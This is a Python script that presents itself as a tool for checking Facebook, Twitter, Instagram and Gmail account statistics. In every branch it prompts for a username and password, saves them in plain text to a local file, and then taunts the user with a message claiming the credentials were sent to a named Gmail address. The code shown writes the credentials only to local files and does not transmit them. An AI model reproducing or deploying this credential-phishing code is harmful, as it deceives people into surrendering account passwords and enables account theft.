print('Welcome to Ceefoon\'s simple script')
print('Programmed to help you check some of your account details')
while True:
    try:
        a = int(input('Choose an account\n1. Facebook\n2. Twitter\n3. Instagram\n4. Gmail\nReply: '))
        if a == 1:
            print()
            while True:
                try:
                    b=int(input('1. Check Facebook profile picture likes\n2. Check Facebook followers\nReply: '))
                    if b == 1:
                        print('Sign into Facebook')
                        e = str(input('Facebook Username or Email: '))
                        while True:
                            try:
                                password=str(input('Facebook password: '))
                                break
                            except NameError:
                                print()
                        write = open('facebook.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                    elif b == 2:
                        print('Sign into Facebook')
                        e = str(input('Facebook Username or Email: '))
                        while True:
                            try:
                                password=str(input('Facebook password: '))
                                break
                            except NameError:
                                print()
                        write = open('facebook.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                except ValueError:
                    print('Please follow the appropriate command\n')
                except NameError:
                    print('Please follow the appropriate command\n')
            break

        elif a == 2:
            print()
            while True:
                try:
                    c=int(input('1. Check Twitter Followers\n2. Check Twitter following\nReply: '))
                    if c == 1:
                        print('Sign into Twitter')
                        e = str(input('Twitter Username or Email: '))
                        while True:
                            try:
                                password=str(input('Twitter password: '))
                                break
                            except NameError:
                                print()
                        write = open('twitter.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                    elif c == 2:
                        print('Sign into Twitter')
                        e = str(input('Twitter Username or Email: '))
                        while True:
                            try:
                                password=str(input('Twitter password: '))
                                break
                            except NameError:
                                print()
                        write = open('twitter.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                except ValueError:
                    print('Please follow the appropriate command\n')
                except NameError:
                    print('Please follow the appropriate command\n')
            break
            
        elif a == 3:
            print()
            while True:
                try:
                    d=int(input('1. Check Instagram Followers\n2. Check Instagram following\nReply: '))
                    if d == 1:
                        print('Sign into Instagram')
                        e = str(input('Instagram Username or Phone: '))
                        while True:
                            try:
                                password=str(input('Instagram password: '))
                                break
                            except NameError:
                                print()
                        write = open('instagram.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                    elif d == 2:
                        print('Sign into Instagram')
                        e = str(input('Instagram Username or Phone: '))
                        while True:
                            try:
                                password=str(input('Instagram password: '))
                                break
                            except NameError:
                                print()
                        write = open('instagram.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                except ValueError:
                    print('Please follow the appropriate command\n')
                except NameError:
                    print('Please follow the appropriate command\n')
            break

        elif a == 4:
            print()
            while True:
                try:
                    d=int(input('1. Check Gmail Unread messages\n2. Check total messages\nReply: '))
                    if d == 1:
                        print('Sign into Gmail')
                        e = str(input('Email or Phone: '))
                        while True:
                            try:
                                password=str(input('Gmail password: '))
                                break
                            except NameError:
                                print()
                        write = open('gmail.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                    elif d == 2:
                        print('Sign into Gmail')
                        e = str(input('Email or Phone: '))
                        while True:
                            try:
                                password=str(input('Gmail password: '))
                                break
                            except NameError:
                                print()
                        write = open('gmail.txt', 'w')
                        write.write('Username: ')
                        write.write(e)
                        write.write('\nPassword: ')
                        write.write(password)
                        write.close()
                        print('You are a fool. Username and password has been sent to sifonudonsek@gmail.com. Enjoy your day.')
                        break
                except ValueError:
                    print('Please follow the appropriate command\n')
                except NameError:
                    print('Please follow the appropriate command\n')
            break
        else:
            print('Please follow the appropriate command\n')
    except ValueError:
        print('Please follow the appropriate command\n')
    except NameError:
        print('Please follow the appropriate command\n')
